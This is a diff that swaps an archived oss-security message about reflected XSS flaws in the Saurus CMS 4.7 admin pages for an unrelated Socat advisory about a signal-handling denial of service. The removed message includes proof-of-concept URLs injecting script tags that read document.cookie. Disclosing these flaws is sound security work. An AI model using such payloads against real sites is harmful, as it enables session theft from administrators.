@@ -1,55 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/28/8
-Message-ID: <CALH-=7wwFG69Z-6XHD-R0UsmHhQ7rj+FSWZmfzPayv6E1kbeUA@mail.gmail.com>
-Date: Wed, 28 Jan 2015 05:50:26 +0100
-From: Steffen Rösemann <steffen.roesemann1986@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/24/6
+Message-ID: <54C3D660.2070206@dest-unreach.org>
+Date: Sat, 24 Jan 2015 18:29:04 +0100
+From: Gerhard Rieger <gerhard@...t-unreach.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE-Request -- Saurus CMS v.4.7 (Community Edition, released: 12.08.2014) -- Multiple reflecting XSS vulnerabilities
+Subject: Socat security advisory 6 - Possible DoS with fork
 Content-Type: text/plain; charset=utf-8
 
-Hi Josh, Steve, vendors, list.
+Socat security advisory 6 - Possible DoS with fork
 
-I found multiple reflecting XSS vulnerabilities in the administrative
-backend of the content management system Saurus CMS v. 4.7 (Community
-Edition, released: 12.08.2014).
+Overview
+  socats signal handler implementations are not async-signal-safe and
+  can cause crash or freeze of socat processes
 
-The parameters used in the following PHP files are prone to reflecting XSS
-attacks (including exploit examples):
+Vulnerability Id: (pending)
 
-user_management.php (vulnerable parameter: "search"):
+Severity: Low
 
-http://
-{TARGET}/admin/user_management.php?tmpuser_search=1&tmpgroup_search=1&tmpsearch_subtree=1&search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&user_search=1&group_search=1&group_search=1&flt_role=&keepThis=true&id=&op=&keel=&group_id=1&view=overview_false&user_id=&user_prev_id=&user_next_id=
+Details
+  Socats signal handler implementations are not asnyc-signal-safe. When
+  a signal is triggered while the process is within a non
+  async-signal-safe function the signal handler will call a non
+  sync-signal-safe function too. POSIX specifies the behaviour in this
+  situation as undefined. Dependend on involved functions, libraries,
+  and operating system, the process can continue, freeze, or crash.
+  Mostly this issue occurs when socat is in listening mode with fork
+  option and a couple of child processes terminate at the same time.
 
-profile_data.php (vulnerable parameter: "data_search"):
+Testcase
+  none
 
-http://
-{TARGET}/admin/profile_data.php?data_search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&profile_search=&profile_id=0
+Affected versions
+  1.0.0.0 - 1.7.2.4
+  2.0.0-b1 - 2.0.0-b7
 
-error_log.php (vulnerable parameter: "filter"):
+Not affected or corrected versions
+  1.7.3.0 and later
+  2.0.0-b8 (to be released) and later
 
-http://
-{TARGET}/admin/error_log.php?id=&op=&keel=&group_id=1&otsi=1&page=&filter=bla&algus=31.12.2014&lopp=07.01.2015&err_type=&otsi=1&page=&filter=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C!--&algus=31.12.2014&lopp=07.01.2015&err_type=
+Workaround
+  none
 
-Vendor patched this vulnerability in the latest commit of Saurus CMS v. 4.7
-(CE, released: 27.01.2015).
+Download
+  The updated sources can be downloaded from:
 
-Could you please assign a CVE-ID for this?
+    http://www.dest-unreach.org/socat/download/socat-1.7.3.0.tar.gz
 
-Thank you very much!
+Credits
+   Credits to Peter Lobsinger
 
-Greetings from Germany.
 
-Steffen Rösemann
 
-References:
-
-[1] http://www.saurus.info
-[2] https://github.com/sauruscms/Saurus-CMS-Community-Edition/issues/61
-[3] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-05.html
-[4]
-https://github.com/sauruscms/Saurus-CMS-Community-Edition/commit/8dec044d0fdabcb9b04e58037623385a97b0d288
-[5]
-http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-05.html
-[6] http://seclists.org/fulldisclosure/2015/Jan/112
-
+Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
